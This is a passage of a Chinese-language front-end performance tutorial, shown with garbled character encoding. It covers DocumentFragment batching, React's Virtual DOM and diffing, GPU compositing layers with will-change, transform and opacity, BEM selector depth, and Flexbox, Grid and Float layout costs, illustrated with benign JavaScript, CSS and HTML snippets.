class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();<br><br><span class="hljs-comment">// æ‰¹é‡æ·»åŠ å…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>  <span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>  item.<span class="hljs-property">textContent</span> = <span class="hljs-string">`Item <span class="hljs-subst">$&#123;i&#125;</span>`</span>;<br>  fragment.<span class="hljs-title function_">appendChild</span>(item);<br>&#125;<br><br><span class="hljs-comment">// å•æ¬¡æ’å…¥çœŸå®DOM</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;list&#x27;</span>).<span class="hljs-title function_">appendChild</span>(fragment);<br></code></pre></td></tr></table></figure><ul><li>å†…å­˜æ“ä½œï¼šåœ¨æ–‡æ¡£ç‰‡æ®µä¸­çš„æ“ä½œä¸ä¼šè§¦å‘é‡æ’&#x2F;é‡ç»˜</li><li>åŸå­æäº¤ï¼šç‰‡æ®µæ’å…¥çœŸå®DOMæ—¶ä»…è§¦å‘å•æ¬¡é‡æ’</li></ul><p><strong>Virtual DOMï¼šæ¡†æ¶çº§ä¼˜åŒ–</strong></p><p>å·¥ä½œåŸç†ï¼š</p><pre class="mermaid">graph LR    A[çŠ¶æ€å˜åŒ–] --> B[ç”Ÿæˆæ–°Virtual DOM]    B --> C{å¯¹æ¯”å·®å¼‚}    C -->|æœ‰å˜åŒ–| D[è®¡ç®—æœ€å°æ›´æ–°]    C -->|æ— å˜åŒ–| E[è·³è¿‡æ›´æ–°]    D --> F[æ‰¹é‡æ›´æ–°çœŸå®DOM]</pre><p>å…³é”®ä¼˜åŠ¿ï¼š</p><ul><li>å·®å¼‚æ¯”å¯¹ï¼ˆDiffingï¼‰ï¼šä»…æ›´æ–°å˜åŒ–éƒ¨åˆ†</li><li>æ‰¹å¤„ç†ï¼šåˆå¹¶å¤šä¸ªçŠ¶æ€å˜æ›´</li><li>è·¨å¹³å°ï¼šæŠ½è±¡æ¸²æŸ“é€»è¾‘ï¼ˆWeb&#x2F;iOS&#x2F;Androidï¼‰</li></ul><p><strong>å®ç°æ¨¡å¼å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">DocumentFragment</th><th align="left">Virtual DOM</th></tr></thead><tbody><tr><td align="left">æ“ä½œå±‚çº§</td><td align="left">çœŸå®DOMèŠ‚ç‚¹</td><td align="left">å†…å­˜ä¸­çš„è½»é‡å¯¹è±¡</td></tr><tr><td align="left">æ›´æ–°ç²’åº¦</td><td align="left">å­æ ‘çº§</td><td align="left">ç»„ä»¶çº§</td></tr><tr><td align="left">è¯­æ³•å¤æ‚åº¦</td><td align="left">åŸç”ŸAPIï¼ˆç®€å•ï¼‰</td><td align="left">éœ€æ¡†æ¶æ”¯æŒï¼ˆå¤æ‚ï¼‰</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">å±€éƒ¨DOMæ›´æ–°</td><td align="left">æ•´ä¸ªåº”ç”¨çŠ¶æ€ç®¡ç†</td></tr><tr><td align="left">å†…å­˜å¼€é”€</td><td align="left">ä½ï¼ˆä¸´æ—¶å®¹å™¨ï¼‰</td><td align="left">ä¸­ï¼ˆç»´æŠ¤è™šæ‹Ÿæ ‘ï¼‰</td></tr></tbody></table><p><strong>React Virtual DOM å®ç°</strong></p><p>(1) JSX ç¼–è¯‘ç»“æœ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸå§‹JSX</span><br>&lt;div className=<span class="hljs-string">&quot;title&quot;</span>&gt;<span class="hljs-title class_">Hello</span>&lt;/div&gt;<br><br><span class="hljs-comment">// ç¼–è¯‘ä¸ºè™šæ‹ŸDOMå¯¹è±¡</span><br>&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;div&#x27;</span>,<br>  <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">className</span>: <span class="hljs-string">&#x27;title&#x27;</span> &#125;,<br>  <span class="hljs-attr">children</span>: [<span class="hljs-string">&#x27;Hello&#x27;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Diffing ç®—æ³•ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”®å€¼ä¼˜åŒ–åˆ—è¡¨å¯¹æ¯”</span><br><span class="hljs-keyword">const</span> list = items.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.id&#125;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;item&#125;</span> /&gt;</span></span> <span class="hljs-comment">// keyé¿å…å…¨é‡é‡æ¸²æŸ“</span><br>));<br><br><span class="hljs-comment">// æ›´æ–°ç­–ç•¥</span><br><span class="hljs-keyword">if</span> (prev.<span class="hljs-property">type</span> === next.<span class="hljs-property">type</span>) &#123;<br>  <span class="hljs-comment">// åŒç±»å‹ç»„ä»¶ï¼šæ›´æ–°å±æ€§</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// ä¸åŒç±»å‹ï¼šå¸è½½é‡å»º</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¤åˆå±‚ä¼˜åŒ–ï¼šwill-change-transform-opacity"><a href="#å¤åˆå±‚ä¼˜åŒ–ï¼šwill-change-transform-opacity" class="headerlink" title="å¤åˆå±‚ä¼˜åŒ–ï¼šwill-change, transform, opacity"></a>å¤åˆå±‚ä¼˜åŒ–ï¼šwill-change, transform, opacity</h3><p><strong>æµè§ˆå™¨æ¸²æŸ“å±‚å æ¨¡å‹</strong></p><pre class="mermaid">graph TB    A[DOMæ ‘] --> B[å¸ƒå±€æ ‘]    B --> C[åˆ†å±‚]    C --> D[ç»˜åˆ¶åˆ—è¡¨]    D --> E[æ …æ ¼åŒ–]    E --> F[åˆæˆæ˜¾ç¤º]</pre><ol><li>å¤åˆå±‚ï¼ˆCompositing Layerï¼‰ï¼šæµè§ˆå™¨å°†é¡µé¢åˆ’åˆ†ä¸ºç‹¬ç«‹å›¾å±‚</li><li>åˆæˆï¼ˆCompositionï¼‰ï¼šGPUç›´æ¥æ··åˆå›¾å±‚ç”Ÿæˆæœ€ç»ˆç”»é¢</li><li>å…³é”®ä¼˜åŠ¿ï¼šä¿®æ”¹ç‰¹å®šå±æ€§å¯è·³è¿‡å¸ƒå±€å’Œç»˜åˆ¶é˜¶æ®µ</li></ol><p><strong>è§¦å‘å¤åˆå±‚çš„CSSå±æ€§</strong></p><p>æ ¸å¿ƒä¸‰å‰‘å®¢ï¼š</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">ä¼˜åŒ–åŸç†</th><th align="left">ä½¿ç”¨ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">transform</td><td align="left">åˆ›å»ºç‹¬ç«‹ä½å›¾ï¼ŒGPUç›´æ¥å¤„ç†ä½ç§»&#x2F;ç¼©æ”¾&#x2F;æ—‹è½¬</td><td align="left">transform: translateX(100px)</td></tr><tr><td align="left">opacity</td><td align="left">GPUæ··åˆé€æ˜åº¦ï¼Œæ— éœ€é‡ç»˜åº•å±‚å†…å®¹</td><td align="left">opacity: 0.5</td></tr><tr><td align="left">will-change</td><td align="left">æå‰å£°æ˜å˜åŒ–å±æ€§ï¼Œæµè§ˆå™¨é¢„åˆ†é…èµ„æº</td><td align="left">will-change: transform</td></tr></tbody></table><p>å…¶ä»–è§¦å‘å±æ€§ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* åˆ›å»ºæ–°å±‚ */</span><br><span class="hljs-attribute">position</span>: fixed;<br><span class="hljs-attribute">backface-visibility</span>: hidden;<br><span class="hljs-attribute">perspective</span>: <span class="hljs-number">1000px</span>;<br><span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">5px</span>); <span class="hljs-comment">/* éƒ¨åˆ†æµè§ˆå™¨ */</span><br><span class="hljs-attribute">mask</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">...</span>);<br></code></pre></td></tr></table></figure><p><strong>will-change æ·±åº¦è§£æ</strong></p><p>æ­£ç¡®åšæ³•ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.optimized</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* é™å®šå…·ä½“å±æ€§ */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>&#125;<br><span class="hljs-selector-class">.optimized</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é”™è¯¯åšæ³•ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é”™è¯¯1ï¼šå£°æ˜è¿‡å¤šå±æ€§ */</span><br><span class="hljs-attribute">will-change</span>: transform, opacity, top, left; <span class="hljs-comment">/* è¿‡åº¦æ¶ˆè€—å†…å­˜ */</span><br><br><span class="hljs-comment">/* é”™è¯¯2ï¼šå…¨å±€åº”ç”¨ */</span><br>* &#123; <span class="hljs-attribute">will-change</span>: transform; &#125; <span class="hljs-comment">/* ä¸¥é‡æ€§èƒ½é—®é¢˜ */</span><br><br><span class="hljs-comment">/* é”™è¯¯3ï¼šä¸é…åˆå®é™…å˜åŒ– */</span><br><span class="hljs-comment">/* æµè§ˆå™¨é¢„å¤‡èµ„æºä½†æœªä½¿ç”¨ */</span><br></code></pre></td></tr></table></figure><p>å£°æ˜å‘¨æœŸç®¡ç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// äº¤äº’å‰å¯ç”¨</span><br>element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;mouseenter&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;transform&#x27;</span>;<br>&#125;);<br><br><span class="hljs-comment">// äº¤äº’åé‡Šæ”¾</span><br>element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;transitionend&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Transform ä¸ Opacity ä¼˜åŒ–æœºåˆ¶</strong></p><p>GPU åŠ é€ŸåŸç†ï¼š</p><pre class="mermaid">sequenceDiagram    Browser->>GPU: æäº¤å›¾å±‚ä½å›¾    Browser->>GPU: å‘é€å˜æ¢æŒ‡ä»¤(transform/opacity)    GPU->>Display: ç›´æ¥åˆæˆæœ€ç»ˆç”»é¢</pre><ul><li>è·³è¿‡å…³é”®è·¯å¾„ï¼šé¿å…é‡æ’ï¼ˆLayoutï¼‰å’Œé‡ç»˜ï¼ˆPaintï¼‰</li><li>60fpsä¿éšœï¼šGPUåˆæˆè€—æ—¶é€šå¸¸å°äº3ms&#x2F;å¸§</li></ul><p><strong>æµè§ˆå™¨å±‚åˆ›å»ºè§„åˆ™</strong></p><p>Chrome å±‚ç±»å‹ï¼š</p><table><thead><tr><th align="left">å±‚ç±»å‹</th><th align="left">è§¦å‘æ¡ä»¶</th><th align="left">å†…å­˜å¼€é”€</th></tr></thead><tbody><tr><td align="left">æ ¹å±‚</td><td align="left">é¡µé¢æ ¹å…ƒç´ </td><td align="left">å¿…éœ€</td></tr><tr><td align="left">æ˜¾å¼å±‚</td><td align="left">will-change&#x2F;transformç­‰</td><td align="left">ä¸­</td></tr><tr><td align="left">é‡å å±‚</td><td align="left">å±‚å ä¸Šä¸‹æ–‡ï¼ˆz-indexï¼‰</td><td align="left">ä½</td></tr><tr><td align="left">æ»šåŠ¨å±‚</td><td align="left">overflow: scroll</td><td align="left">é«˜</td></tr></tbody></table><p>å†…å­˜æˆæœ¬è®¡ç®—ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text">å†…å­˜å ç”¨ = å±‚å®½åº¦ Ã— é«˜åº¦ Ã— 4å­—èŠ‚ï¼ˆRGBAï¼‰<br>ç¤ºä¾‹ï¼š1920x1080å±‚ â‰ˆ 1920Ã—1080Ã—4 â‰ˆ 8MB<br></code></pre></td></tr></table></figure><p><strong>è°ƒè¯•å·¥å…·åˆ†æ</strong></p><p>Chrome DevToolsï¼š</p><ul><li>Layers é¢æ¿ï¼š<ul><li>å¯è§†åŒ–æ‰€æœ‰å¤åˆå±‚</li><li>æŸ¥çœ‹å±‚å°ºå¯¸&#x2F;å†…å­˜å ç”¨&#x2F;åˆ›å»ºåŸå› </li></ul></li><li>Rendering é¢æ¿ï¼š<ul><li>å¼€å¯ Layer bordersï¼šæ©™è‰²è¾¹æ¡†&#x3D;å¤åˆå±‚</li><li>Scrolling performanceï¼šæ ‡è®°æ»šåŠ¨å±‚é—®é¢˜</li></ul></li></ul><h2 id="3-2-é«˜æ•ˆCSSå®è·µ"><a href="#3-2-é«˜æ•ˆCSSå®è·µ" class="headerlink" title="3.2 é«˜æ•ˆCSSå®è·µ"></a>3.2 é«˜æ•ˆCSSå®è·µ</h2><h3 id="é€‰æ‹©å™¨æ€§èƒ½ï¼šBEM-çº¦æŸæ·±åº¦"><a href="#é€‰æ‹©å™¨æ€§èƒ½ï¼šBEM-çº¦æŸæ·±åº¦" class="headerlink" title="é€‰æ‹©å™¨æ€§èƒ½ï¼šBEM çº¦æŸæ·±åº¦"></a>é€‰æ‹©å™¨æ€§èƒ½ï¼šBEM çº¦æŸæ·±åº¦</h3><p><strong>CSSé€‰æ‹©å™¨åŒ¹é…æœºåˆ¶</strong></p><p>æµè§ˆå™¨è§£æé¡ºåºï¼š</p><pre class="mermaid">graph RL    A[.nav__item--active] --> B[--activeä¿®é¥°ç¬¦]    A --> C[__itemå…ƒç´ ]    A --> D[.navå—]    D --> E[æ ·å¼è§„åˆ™]</pre><ul><li>ä»å³å‘å·¦è§£æï¼šæµè§ˆå™¨å…ˆåŒ¹é…æœ€å³ä¾§é€‰æ‹©å™¨ï¼ˆå¦‚.nav__itemâ€“activeï¼‰</li><li>å…³é”®è·¯å¾„ï¼šæŸ¥æ‰¾æ‰€æœ‰ â€“active ç±» â†’ ç­›é€‰å« __item çš„å…ƒç´  â†’ éªŒè¯çˆ¶çº§æœ‰ .nav</li></ul><p>æ€§èƒ½æ¶ˆè€—å…¬å¼ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Text">é€‰æ‹©å™¨å¼€é”€ = åŒ¹é…æ­¥éª¤æ•° Ã— æ–‡æ¡£å…ƒç´ æ•°é‡<br></code></pre></td></tr></table></figure><p><strong>BEMå‘½åè§„èŒƒæ ¸å¿ƒ</strong></p><p>ç»“æ„å®šä¹‰ï¼š</p><table><thead><tr><th align="left">éƒ¨åˆ†</th><th align="left">è¯­æ³•</th><th align="left">ç¤ºä¾‹</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">Block</td><td align="left">.block</td><td align="left">.nav</td><td align="left">ç‹¬ç«‹åŠŸèƒ½æ¨¡å—</td></tr><tr><td align="left">Element</td><td align="left">__element</td><td align="left">.nav__item</td><td align="left">å—çš„ç»„æˆéƒ¨åˆ†</td></tr><tr><td align="left">Modifier</td><td align="left">â€“modifier</td><td align="left">.nav__itemâ€“active</td><td align="left">çŠ¶æ€&#x2F;å˜ä½“</td></tr></tbody></table><p>æ·±åº¦çº¦æŸåŸåˆ™:</p><p>(1) ç¦æ­¢åµŒå¥—ï¼šå…ƒç´ é€‰æ‹©å™¨ä¸ä¾èµ–ç¥–å…ˆç»“æ„</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é”™è¯¯ï¼šä¾èµ–ç»“æ„ */</span><br><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-class">.item</span> <span class="hljs-selector-class">.text</span> &#123; ... &#125;<br><br><span class="hljs-comment">/* æ­£ç¡®ï¼šBEMæ‰å¹³åŒ– */</span><br><span class="hljs-selector-class">.nav__text</span> &#123; ... &#125;<br></code></pre></td></tr></table></figure><p>(2) æœ€å¤§æ·±åº¦ï¼šé€‰æ‹©å™¨ä¸è¶…è¿‡3ä¸ªéƒ¨åˆ†</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* æœ‰æ•ˆBEM */</span><br><span class="hljs-selector-class">.block__element--modifier</span> <br><br><span class="hljs-comment">/* æ— æ•ˆï¼ˆè¶…è¿‡3éƒ¨åˆ†ï¼‰ */</span><br><span class="hljs-selector-class">.block__element__subelement--modifier</span><br></code></pre></td></tr></table></figure><p><strong>BEMæ€§èƒ½ä¼˜åŠ¿åŸç†</strong></p><p>(1) å‡å°‘åŒ¹é…æ­¥éª¤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* ä¼ ç»ŸåµŒå¥—ï¼ˆ4æ­¥åŒ¹é…ï¼‰ */</span><br><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123; ... &#125; <br><span class="hljs-comment">/* åŒ¹é…è¿‡ç¨‹ï¼š1.æ‰€æœ‰a â†’ 2.åœ¨liå†… â†’ 3.åœ¨ulå†… â†’ 4.åœ¨navå†… */</span><br><br><span class="hljs-comment">/* BEMç­‰æ•ˆï¼ˆ1æ­¥åŒ¹é…ï¼‰ */</span><br><span class="hljs-selector-class">.nav__link</span> &#123; ... &#125;<br><span class="hljs-comment">/* åŒ¹é…è¿‡ç¨‹ï¼š1.æ‰€æœ‰.nav__linkå…ƒç´  */</span><br></code></pre></td></tr></table></figure><p>(2) é™ä½æ ·å¼å†²çª</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* ä¼ ç»Ÿæ–¹å¼ï¼šå¯èƒ½æ„å¤–å½±å“å…¶ä»–åŒºåŸŸ */</span><br><span class="hljs-selector-class">.content</span> <span class="hljs-selector-class">.title</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125;<br><br><span class="hljs-comment">/* BEMï¼šä½œç”¨åŸŸéš”ç¦» */</span><br><span class="hljs-selector-class">.content__title</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125; <span class="hljs-comment">/* åªå½±å“contentå—å†… */</span><br><span class="hljs-selector-class">.product__title</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;  <span class="hljs-comment">/* ç‹¬ç«‹ä½œç”¨åŸŸ */</span><br></code></pre></td></tr></table></figure><p>(3) é¿å…è¿‡åº¦ä¿®é¥°</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å†—ä½™é€‰æ‹©å™¨ */</span><br><span class="hljs-selector-tag">button</span><span class="hljs-selector-class">.btn</span><span class="hljs-selector-class">.primary</span> &#123; ... &#125; <span class="hljs-comment">/* ç‰¹å¼‚æ€§è¿‡é«˜ */</span><br><br><span class="hljs-comment">/* BEMç®€åŒ– */</span><br><span class="hljs-selector-class">.btn--primary</span> &#123; ... &#125; <span class="hljs-comment">/* ç‰¹å¼‚æ€§ä¿æŒä½ä½ */</span><br></code></pre></td></tr></table></figure><p><strong>BEMå®æ–½è§„èŒƒ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- æ­£ç¡®ï¼šç¬¦åˆBEMå±‚çº§ --&gt;<br>&lt;nav class=&quot;nav&quot;&gt;<br>  &lt;ul class=&quot;nav__list&quot;&gt;<br>    &lt;li class=&quot;nav__item&quot;&gt;<br>      &lt;a class=&quot;nav__link nav__link--active&quot;&gt;é¦–é¡µ&lt;/a&gt;<br>    &lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/nav&gt;<br><br>&lt;!-- é”™è¯¯ï¼šå…ƒç´ åµŒå¥—è¿‡æ·± --&gt;<br>&lt;div class=&quot;nav&quot;&gt;<br>  &lt;ul&gt;<br>    &lt;li&gt;<br>      &lt;a class=&quot;nav-link-active&quot;&gt;é¦–é¡µ&lt;/a&gt;<br>    &lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// SASSå®ç°<br>// BEMè§„èŒƒå†™æ³•<br><span class="hljs-selector-class">.nav</span> &#123;<br>  &amp;__list &#123; ... &#125;<br>  <br>  &amp;__item &#123;<br>    &amp;<span class="hljs-attr">--active</span> &#123; ... &#125; // ä¿®é¥°ç¬¦<br>  &#125;<br>  <br>  &amp;__link &#123;<br>    &amp;<span class="hljs-selector-pseudo">:hover</span> &#123; ... &#125; // ä¼ªçŠ¶æ€<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* ç¼–è¯‘ç»“æœ */</span><br><span class="hljs-selector-class">.nav__list</span> &#123; ... &#125;<br><span class="hljs-selector-class">.nav__item--active</span> &#123; ... &#125;<br><span class="hljs-selector-class">.nav__link</span><span class="hljs-selector-pseudo">:hover</span> &#123; ... &#125;<br></code></pre></td></tr></table></figure><h3 id="å¸ƒå±€æ€§èƒ½ï¼šFlexbox-Grid-Float"><a href="#å¸ƒå±€æ€§èƒ½ï¼šFlexbox-Grid-Float" class="headerlink" title="å¸ƒå±€æ€§èƒ½ï¼šFlexbox &gt; Grid &gt; Float"></a>å¸ƒå±€æ€§èƒ½ï¼šFlexbox &gt; Grid &gt; Float</h3><p><strong>å¸ƒå±€å¼•æ“æ€§èƒ½å¯¹æ¯”</strong></p><p>æ¸²æŸ“ç®¡çº¿å·®å¼‚ï¼š</p><pre class="mermaid">graph LR    A[å¸ƒå±€è®¡ç®—] --> B{Float}    A --> C{Flexbox}    A --> D{Grid}    B --> E[å¤šæ¬¡è®¡ç®—]    C --> F[å•æ¬¡é€’å½’]    D --> G[å•æ¬¡è®¡ç®—]</pre><p>æ€§èƒ½æ’åºä¾æ®ï¼š</p><ol><li>è®¡ç®—å¤æ‚åº¦ï¼šFloat &gt; Grid &gt; Flexbox</li><li>æ¸²æŸ“é€Ÿåº¦ï¼šFlexbox â‰ˆ Grid &gt; Floatï¼ˆ2-3å€å·®è·ï¼‰</li><li>é‡æ’å½±å“èŒƒå›´ï¼šFloatï¼ˆå…¨å±€ï¼‰ &gt; Gridï¼ˆå®¹å™¨å†…ï¼‰ â‰ˆ Flexboxï¼ˆå®¹å™¨å†…ï¼‰</li></ol><p><strong>Floatï¼šä¼ ç»Ÿå¸ƒå±€çš„æ€§èƒ½é™·é˜±</strong></p><p>æ¸²æŸ“æœºåˆ¶ï¼š</p><pre class="mermaid">sequenceDiagram    æµè§ˆå™¨->>æµ®åŠ¨å…ƒç´ : è„±ç¦»æ–‡æ¡£æµ    æµè§ˆå™¨->>åç»­å†…å®¹: é‡æ’ï¼ˆç¯ç»•å¸ƒå±€ï¼‰    æµè§ˆå™¨->>çˆ¶å®¹å™¨: é«˜åº¦å¡Œé™·    æµè§ˆå™¨->>æ¸…é™¤æµ®åŠ¨: é¢å¤–å¸ƒå±€è®¡ç®—</pre><ol><li>å…¨å±€é‡æ’ï¼šä¿®æ”¹ä»»æ„æµ®åŠ¨å…ƒç´ å½±å“æ•´ä¸ªæ–‡æ¡£æµ</li><li>é«˜åº¦è®¡ç®—ï¼šéœ€è¦é¢å¤–æ¸…é™¤æµ®åŠ¨ï¼ˆclearfix hackï¼‰</li><li>å¤åˆå±‚åˆ›å»ºï¼šæµ®åŠ¨å…ƒç´ å¸¸è§¦å‘é¢å¤–åˆæˆå±‚ï¼ˆå†…å­˜å¼€é”€ï¼‰</li></ol><p><strong>Flexboxï¼šç°ä»£å¸ƒå±€ä¼˜åŒ–æ–¹æ¡ˆ</strong></p><p>æ€§èƒ½ä¼˜åŠ¿ï¼š</p><ol><li>å•æ¬¡é€’å½’è®¡ç®—ï¼šå®¹å™¨å°ºå¯¸å˜åŒ–æ—¶ä»…é‡æ–°è®¡ç®—ç›´æ¥å­é¡¹</li><li>æœ€å°åŒ–é‡æ’èŒƒå›´ï¼šä¿®æ”¹å­é¡¹ä»…å½±å“å®¹å™¨å†…éƒ¨</li><li>GPUåŠ é€Ÿæ½œåŠ›ï¼šé…åˆtransformå®ç°é«˜æ€§èƒ½åŠ¨ç”»</li></ol><p>æ¸²æŸ“æµç¨‹ä¼˜åŒ–ï¼š</p><pre class="mermaid">graph TB    A[è®¾ç½®display:flex] --> B[è®¡ç®—ä¸»è½´å°ºå¯¸]    B --> C[è®¡ç®—äº¤å‰è½´å°ºå¯¸]    C --> D[åˆ†é…å‰©ä½™ç©ºé—´]    D --> E[å•æ¬¡ç»˜åˆ¶å®Œæˆ]</pre><p><strong>Gridï¼šäºŒç»´å¸ƒå±€çš„é«˜æ•ˆå®ç°</strong></p><p>æ€§èƒ½ç‰¹æ€§:</p><ol><li>æ˜¾å¼å®šä½ï¼šè¡Œåˆ—æ¨¡æ¿é¢„å…ˆå®šä¹‰ï¼Œå‡å°‘åŠ¨æ€è®¡ç®—</li><li>åŒºåŸŸéš”ç¦»ï¼šä¿®æ”¹å•å…ƒæ ¼ä¸å½±å“å¤–éƒ¨å¸ƒå±€</li><li>åˆ†å±‚æ¸²æŸ“ï¼šæ”¯æŒç‹¬ç«‹å®šä½çš„å¤åˆå±‚</li></ol><p>ä¸Flexboxçš„å…³é”®å·®å¼‚:</p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Grid</th><th align="left">Flexbox</th></tr></thead><tbody><tr><td align="left">ç»´åº¦èƒ½åŠ›</td><td align="left">äºŒç»´å¸ƒå±€ï¼ˆè¡Œ+åˆ—ï¼‰</td><td align="left">ä¸€ç»´å¸ƒå±€ï¼ˆä¸»è½´+äº¤å‰è½´ï¼‰</td></tr><tr><td align="left">æ¸²æŸ“è®¡ç®—æ–¹å¼</td><td align="left">çŸ©é˜µè®¡ç®—</td><td 